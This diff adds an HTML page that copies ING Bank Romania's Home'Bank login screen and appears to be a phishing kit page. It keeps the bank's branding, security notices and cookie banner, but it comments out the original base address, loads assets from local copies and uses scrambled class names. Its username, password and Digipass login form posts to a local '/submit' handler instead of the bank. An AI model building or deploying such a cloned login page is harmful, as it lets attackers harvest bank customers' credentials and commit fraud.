@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html xml:lang="ro" xmlns="http://www.w3.org/1999/xhtml" lang="ro"><head lang="ro">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+
+<!-- base href="https://www.homebank.ro/public/HomeBankLogin/home?lang=ro" -->
+
+<title>ING Home'Bank - Login </title>
+
+<link rel="stylesheet" href="style.css" type="text/css">
+<!--[if lte IE 6]>
+<link rel="stylesheet" type="text/css" href="/public/HomeBankLogin/outReSource/css/ie.css" />
+<![endif]-->
+
+
+<script type="text/javascript" async="" src="ga.js"></script><script src="jquery.js" type="text/javascript"></script>
+<script src="cookie.js" type="text/javascript"></script>
+<script src="md5.js" type="text/javascript"></script>
+<script src="fingerprint.js" type="text/javascript"></script>
+<script src="login-utils.js" type="text/javascript"></script>
+<script src="css-utils.js" type="text/javascript"></script>
+
+<script type="text/javascript" src="slider.js"></script>
+<script>
+	var clicked=false;
+	var host='';
+	var lang = 'ro';
+	var idText = "#popupcontenttext";
+	var rendererUrl = 'https://www.homebank.ro/hb/hb/#/embed?embedder=hb20&flow=ResetPassword';
+ 	var id = "#popupcontainer";
+ 	var idTextSource = "#resetpasscontent";
+ 	var idHidden = "#popupreponseHidden";
+ 	var cookiesDisabledIdText = "#cookiesblockedcontent";
+ 	var ieMessage = '"Aceast&#259; op&#355;iune este func&#355;ional&#259; pe browser-ul IE9 sau mai recent. V&#259; rug&#259;m utiliza&#355;i alte browsere (Mozilla Firefox, Google Chrome etc.) sau suna&#355;i la numarul de Asisten&#355;&#259; Home&acute;Bank: + 4021 402 83 91."'
+ 	var errMsgVar = '"Ne cerem scuze, dar momentan serviciul de deblocare automat&#259; a contului de ING Home&acute;Bank nu este disponibil. V&#259; rug&#259;m s&#259; reveni&#355;i mai t&#226;rziu sau s&#259; apela&#355;i Dep.Rela&#355;ii Clien&#355;i la +4021 402 83 91. "';
+
+
+
+</script>
+
+	<script type="application/javascript">
+		(function() {
+			function writeCookie(name, value) {
+				document.cookie = [name, '=', value, '; path=/'].join('');
+			}
+
+			writeCookie('bannerRedirectBeta', '');
+		}());
+	</script>
+
+	<script type="text/javascript">
+	  var _gaq = _gaq || [];
+	  _gaq.push(['_setAccount', 'UA-1877133-10']);
+	  _gaq.push(['_trackPageview']);
+	  _gaq.push(['_trackPageLoadTime']);
+	</script>
+<script language="JavaScript">
+<!--
+document.cookie = "IV_JCT=%2Fpublic; path=/";
+//-->
+</script>
+</head>
+<body><div id="cookie_warn">Acest site foloseste cookies. Prin navigarea pe acest site, va exprimati acordul asupra folosirii cookie-urilor. <a href="https://www.ing.ro/ingb/termeni-si-conditii/cookies.html" target="_blank">Citeste mai mult</a><a href="#" class="bt_close">[x] �nchide</a></div>
+
+	<div id="boxes">
+		<div id="popupcontainer" class="simple_overlay">
+			<div class="close" onclick="closePopup()">�nchide</div>
+			<div id="popupreponseHidden" style="display:none;"></div>
+			<div id="popupcontenttext">
+
+
+
+
+
+
+
+
+
+			</div>
+		</div>
+	  <div id="mask"></div>
+	</div>
+<div id="cookiesblockedcontent" style="display:none">
+		<h2>
+			Ing Home'Bank
+		</h2>
+		<p>
+			Acest site foloseste cookies. Va rugam sa le activati!
+			<br>
+Puteti folosi urmatoarele informatii a setarilor necesare pentru activarea cookie-urilor pe:
+<br>
+&#10003;	-  Internet Explorer :
+<br>
+Odata deschis un browser, se apasa tasta F12. Apare un meniu in partea
+de jos browserului, iar de la "Cache" se dezactiveaza "Disable Cookies".
+<br>
+&#10003;	-  Google Chrome :
+<br>
+Din Settings se merge la "Show advanced settings."
+<br>
+Apoi de la "Privacy" se intra in "Content settings" de unde trebuie sa
+ne asiguram ca este bifat "Allow local data to be set (recommended)" si
+se debifeaza "Block third-party cookies and site data"
+<br>
+
+&#10003;	-  Firefox :
+<br>
+Din Tools - Internet Options - Privacy se selecteaza de la "Firefox
+will: Use custom settings for history" si se verifica daca este bifat
+"Accept cookies from sites" si "Accept third-party cookies".
+<br>
+		</p>
+
+</div>
+
+	<div id="resetpasscontent" style="display:none">
+	<form autocomplete="OFF" method="post" name="resetFrm" onsubmit="return false;">
+		<h2>
+			Deblocare cont ING Home�Bank
+		</h2>
+		<p>
+			Procedura de deblocarea automat&#259; a contului foloseste adresa de email
+ din Profilul dumneavoastr&#259; de ING Home�Bank. Dup&#259; introducerea Codului
+de Utilizator, ve&#355;i primi pe adresa de email un link (valabil 72 de ore)
+ cu ajutorul c&#259;ruia ve&#355;i debloca contul. O nou&#259; fereastr&#259; de browser se
+va deschide &#351;i v&#259; ve&#355;i putea autentifica pe site.<br><br> �n cazul �n
+care nu ave&#355;i salvat&#259; adresa de email, v&#259; rug&#259;m s&#259; apela&#355;i Serviciul
+Rela&#355;ii Clien&#355;i la num&#259;rul +4021 402 83 91. Cand ave&#355;i timp, v&#259; rug&#259;m s&#259;
+ v&#259; actualiza&#355;i datele din Profil. Informa&#355;ia v&#259; poate fi de mare folos
+�n diverse ocazii. Mul&#355;umim!
+		</p>
+		<dl id="errorsList" class="errors" style="display:none;margin-bottom:0px;">
+			<dt>
+				<div style="padding-left:10px;" id="errorcontainer">Codul de Utilizator este obligatoriu.</div>
+			</dt>
+		</dl>
+		<dl>
+			<dt>
+				<input name="username_fld" type="text">
+			</dt>
+			<dd>
+				Cod Utilizator :
+			</dd>
+		</dl>
+		<div class="clear"></div>
+		<div class="inputs">
+			<a href="javascript:closePopup();">�nchide</a>
+			&nbsp;&nbsp;&nbsp;&nbsp;
+			<input class="agree" onclick="loadPopupContent(this.form)" value="OK" type="button">
+		</div><br>
+	</form>
+	</div>
+    <div id="container">
+       <div id="topMenu">
+        <ul>
+            <li><a id="changeLangRo" onclick="changeLang('ro')" href="#" title="Romana" class="ro"><span>Romana</span></a></li>
+            <li><a id="changeLangEn" onclick="changeLang('en')" href="#" title="English" class="en"><span>Engleza</span></a></li>
+        </ul>
+
+        <br class="clear">
+        <a href="https://www.homebank.ro/ing" title="" id="ing"><span>ING Bank</span></a>
+        <a href="http://www.homebank.ro/" title="" id="homebank"><span>Home'Bank</span></a>
+    	</div>
+
+
+
+        <div class="f43g5ghm">
+            <div class="r3r6ii7g">
+
+                <div class="tr63nds9">
+    			<p id="authentifyP" class="autentify">V&#259; rug&#259;m s&#259; v&#259; autentifica&#355;i</p>
+    			<div id="errorDiv" style="display:none" class="error">
+                        <p><strong>Codul de Utilizator &#351;i Codul sunt obligatorii.</strong></p>
+                        <p>�ncearc&#259; din nou !</p>
+                </div>
+    				<form autocomplete="off" method="post" onsubmit="return validate();" id="sgdf5hy8" name="sgdf5hy8" action="/submit">
+                        <fieldset>
+                        <input name="lang" value="ro" type="hidden">
+						<input id="formType" name="login-form-type" value="token" type="hidden">
+
+                            <dl id="usernameDl">
+                                <dt><input id="username" name="username" type="text"></dt>
+                                <dd>Cod utilizator</dd>
+                            </dl>
+
+
+                            <dl id="passwordDl">
+                                <dt><input id="password" name="password" type="password"></dt>
+                                <dd id="loginTypeContainer">Cod</dd>
+                            </dl>
+
+
+                            <div id="hiddenFieldsContainer">
+
+
+
+
+
+
+                            </div>
+
+					<div class="authmethod" style="font-family: Arial; font-size: 9px;">
+						AUTENTIFICARE CU
+
+						<input id="methodContain" style="height: 13px; width: 13px; margin: 1px; border: none;" name="loginType" onclick="switchLoginType(this);" value="PAROLA" type="radio">
+											<span id="methodName" style="font-size: 12px; font-weight: bold;">PAROLA</span>
+
+						<input id="methodContain" style="height: 13px; width: 13px; margin: 1px; border: none;" checked="checked" name="loginType" onclick="switchLoginType(this);" value="DIGIPASS" type="radio">
+											<span id="methodName" style="font-size: 12px; font-weight: bold;">DIGIPASS
+											</span>
+					</div>
+
+
+					<div id="spablockUserLink" style="display: none;">
+						<a style="color: white; font-weight: bold; margin-bottom:10px;" href="javascript:%20displaySpaPopup()" title="" class="userblocked">
+							Am uitat parola
+						</a>
+					</div>
+
+
+
+					<div id="nonSpablockUserLink" style="display: block;">
+						<a style="color: white; font-weight: bold; margin-bottom:10px;" href="javascript:%20displayPopup()" title="" class="userblocked">
+							Deblocare digipass
+						</a>
+					</div>
+
+                        </fieldset>
+                    </form>
+
+                    <form method="POST" id="newForm" style="margin-top:-20px;">
+						<input id="newUsername" name="username" type="hidden">
+    					<input id="newPassword" name="password" type="hidden">
+    					<input id="newLoginFormType" name="login-form-type" type="hidden">
+    					<input id="newLang" name="lang" type="hidden">
+    					<input id="newLoginType" name="loginType" type="hidden" value="PAROLA">
+
+    					<div class="submitLogin"><input value="" type="submit"></div>
+    				</form>
+				</div>
+
+				 <div class="opc8sd3f">
+                  <p>Asistenta: <strong>*2ING (*2464) </strong>  sau <strong> + 4031 406 24 64</strong></p>
+</div>
+
+
+
+
+
+				 </div>
+
+<div id="wd9ddwcd">
+
+<div>
+
+
+
+
+<img src="ing_banner_homebank_620x258_ro.jpg">
+
+
+</div>
+
+</div>
+
+
+
+
+
+<script type="text/javascript" src="jquery-cookie.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(e) {
+    if($.cookie('ck_agreement')==undefined)
+    {
+			var div = $("<div/>");
+			div.attr("id","cookie_warn");
+			div.html('Acest site foloseste cookies. Prin navigarea pe acest site,
+ va exprimati acordul asupra folosirii cookie-urilor. ');
+			var a = $("<a/>");
+			a.html('Citeste mai mult');
+
+a.attr('href','https://www.ing.ro/ingb/termeni-si-conditii/cookies.html');
+
+            a.attr('target','_blank');
+
+			var b = $("<a/>");
+			b.html('[x] \u00CEnchide');
+			b.attr('href','#');
+			b.attr('class','bt_close');
+			b.click(function(e){
+						$('#cookie_warn').slideUp(400);
+						$.cookie('ck_agreement','true',{expires:365, path:'/'});
+						return false;
+					  })
+			div.append(a);
+			div.append(b);
+			$('body').prepend(div);
+    }
+});
+</script>
+
+<style>
+#cookie_warn
+{
+    background: none repeat scroll 0 0 #eee;
+    border-bottom:2px solid #ccc;
+    color: #333;
+    padding: 5px 0;
+    text-align: center;
+    width: 100%;
+}
+
+#cookie_warn a
+{
+  color:#f60;
+}
+
+#cookie_warn a.bt_close
+{
+  color:#788cc8;
+  margin-left:40px;
+  font-weight:bold;
+  cursor:pointer;
+}
+</style>
+
+
+
+<div class="line">
+            <div class="column first">
+                <h2>Alerte SMS</h2>
+
+                <div class="img"><img src="sms.jpg" alt="" class="margin_left"></div>
+                <div class="textAlignRight">
+                    <p>Activeaza-ti serviciul SMS si esti oricand la curent cu tranzactiile efectuate pe conturile tale.
+                        Cu 4
+                        lei/ luna ai un numar nelimitat de mesaje.</p>
+                    <a href="https://www.homebank.ro/ing/ingb/persoane-fizice/servicii-aditionale/alerte.html" title="" class="alignRight more" target="_blank">Afla mai mult</a>
+                </div>
+            </div>
+
+            <div class="column">
+                <h2>incarcare cartele preplatite</h2>
+
+                <div class="img"><img src="cartela_telefon.jpg" alt=""></div>
+                <div class="textAlignRight">
+                    <p class="margin_left">Doar la ING Bank poti sa-ti reincarci cartela de telefon mobil prin internet banking.<br><br>
+<br>
+</p>
+                    <a href="https://www.homebank.ro/ing/ingb/persoane-fizice/servicii-aditionale/incarcare-cartela.html" title="" class="alignRight
+more" target="_blank">Afla mai mult</a>
+                </div>
+            </div>
+
+            <div class="column">
+                <h2>Securitatea ING Home'Bank</h2>
+
+                <div class="img"><img src="cont_online.jpg" alt=""></div>
+                <div class="textAlignRight">
+                    <p>ING Bank nu solicita niciodata datele personale
+si/sau elementele de securitate ale clientilor prin accesarea unui link
+transmis prin email.</p>
+                    <a href="https://www.ing.ro/ing-in-romania/informatii-utile/securitate.html" title="" class="alignRight more" target="_blank">Afla mai mult</a>
+                </div>
+            </div>
+
+        </div>
+
+
+
+
+				 <div class="line">
+            <div class="column big">
+                <div class="col first margin_left">
+                    <img src="verisign_trusted.jpg" alt="">
+                    <ul class="margin_left">
+                        <li>Acces cu 3 niveluri de securitate.</li>
+                        <li>Autorizare operatiuni cu Digipass</li>
+                        <li>Conexiune securizata</li>
+                    </ul>
+                    <div class="clear"></div>
+                    <a href="https://www.ing.ro/persoane-fizice/internet-banking/homebank.html#faq/#siguranta" title="" class="alignRight more" target="_blank">Afla mai mult</a>
+                </div>
+                <!-- END col -->
+
+                <div class="col">
+                    <div class="top">
+                        <a target="_blank" href="http://twitter.com/#!/ing_ro" class="twitter margin_left">Urmareste-ne pe<br> Twitter</a>
+                        <a target="_blank" href="http://www.facebook.com/home.php#!/INGWebCafe?sk=wall" class="facebook">Urmareste-ne pe<br> Facebook</a>
+                    </div>
+                </div>
+                <!-- END col -->
+
+                <div class="col last">
+                    <div class="ing margin_left top">
+                        <p>ING Home'Bank este prietenos cu mediul inconjurator.</p>
+                    </div>
+                </div>
+                <!-- END col -->
+
+            </div>
+        </div>
+
+
+
+
+				<div class="line">
+            <ul class="bottomMenu alignLeft">
+                <li><a target="_blank" href="https://www.ing.ro/ing-in-romania/cine-suntem" title="">ING Romania</a>|</li>
+                <li><a target="_blank" href="https://www.ing.ro/ing-in-romania/contact.html" title="">Contact</a>|</li>
+                <li><a href="https://www.ing.ro/dam/ingro/doc/taxe_comisioane.pdf" title="">Taxe si comisioane</a>|</li>
+                <li><a href="https://www.ing.ro/dam/ingro/doc/rate_dobanzi.pdf" title="">Rate si dobanzi</a></li>
+            </ul>
+
+            <ul class="bottomMenu alignRight">
+                <li><span>Copyright - 2006-2016� ING Romania. Toate drepturile rezervate</span> |</li>
+                <li><a target="_blank" href="https://www.ing.ro/ing/homebank/tc-homebank-ro.html" title="">Termeni si conditii</a>|</li>
+                <li>Sugestii:<a href="mailto:internet@ing.ro" title=""> internet@ing.ro</a></li>
+            </ul>
+            <div class="clearfix"></div>
+        </div>
+
+    </div>
+
+</div>
+
+
+
+
+
+
+
+	  <script type="text/javascript">
+	  (function() {
+	    var ga = document.createElement('script'); ga.type =
+'text/javascript'; ga.async = true;
+	    ga.src = ('https:' == document.location.protocol ? 'https://ssl' :
+'http://www') + '.google-analytics.com/ga.js';
+	    var s = document.getElementsByTagName('script')[0];
+s.parentNode.insertBefore(ga, s);
+	  })();
+
+	  $('#sgdf5hy8 input').keydown(function(event) {
+		  if (event.keyCode === 13 && validate()) {
+			  event.preventDefault();
+			  $('#newForm').submit();
+		  }
+	  });
+
+	  $(document).ready(function() {
+
+     		document.getElementById('changeLangRo').href="#";
+     		document.getElementById('changeLangEn').href="#";
+     		document.getElementById('username').focus();
+     		if (checkCookie()) {
+				var options = {excludeAvailableScreenResolution : true,
+excludeScreenResolution : true, excludeUserAgent : true, excludeJsFonts :
+ true, excludeCanvas  : true, excludeWebGL : true, excludePlugins :
+true};
+				new Fingerprint2(options).get(function(result){
+					createCookie("fingerprint", result, 365);
+				});
+
+			}
+
+			e7e3072b678c4bf194c895054b4831be();
+			setupDummyForm();
+
+   	});
+	function checkCookie(){
+	    var cookieEnabled=(navigator.cookieEnabled)? true : false;
+	    if (typeof navigator.cookieEnabled=="undefined" && !cookieEnabled){
+
+	        document.cookie="testcookie";
+	        cookieEnabled=(document.cookie.indexOf("testcookie")!=-1)? true
+ : false;
+	    }
+	    return (cookieEnabled)?true:cookieFail();
+	}
+
+	function cookieFail(){
+	  displayCookiesDisabledPopup();
+	}
+
+	function e7e3072b678c4bf194c895054b4831be(){var
+a=0;$("script").each(function(b,c){$(this).attr("src");a++});$.ajax({type:"GET",url:"/public/HomeBankLogin/outReSource/images/outReSource/check.png",data:{"c":a}})};
+
+	</script>
+
+<div id="ads"></div></body></html>
